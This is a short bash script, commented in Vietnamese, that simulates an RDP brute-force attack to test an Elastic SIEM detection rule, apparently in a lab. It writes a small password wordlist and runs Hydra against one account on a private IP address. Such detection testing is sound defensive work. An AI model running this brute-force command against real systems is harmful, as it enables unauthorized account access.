#!/bin/bash
# -------------------------------------------------------------------------
# Kịch bản giả lập tấn công Brute Force RDP
# Mục tiêu: Kiểm thử khả năng phát hiện của Elastic SIEM (Detection Rule)
# -------------------------------------------------------------------------
# 1. Tự động tạo file mật khẩu (Wordlist)
# Sử dụng lệnh echo -e để tạo danh sách mật khẩu phổ biến
# Việc này đảm bảo script luôn có đủ dữ liệu để vượt ngưỡng Threshold của SIEM
echo -e "123\n456\npassword\nadmin\nadmin123\nroot\n123456\nqwerty\nuser\nlogin\nclient\nserver\npassword123\nsecurity\nhack" > pass.txt
# 2. Thực hiện tấn công Brute Force qua giao thức RDP bằng Hydra
# Giải thích các tham số:
# -l: Tài khoản mục tiêu trên máy Windows
# -P: File wordlist vừa được tạo ở bước trên
# -t 1: Chỉ chạy 1 luồng kết nối duy nhất để tránh làm sập cổng RDP
# -w 5: Đợi 5 giây giữa mỗi lần thử mật khẩu để tạo log Event ID 4625 chuẩn xác
# -V: Hiển thị chi tiết (Verbose) từng cặp User/Pass đang thử
hydra -l ngovuquang -P pass.txt rdp://192.168.52.154 -t 1 -w 5 -V
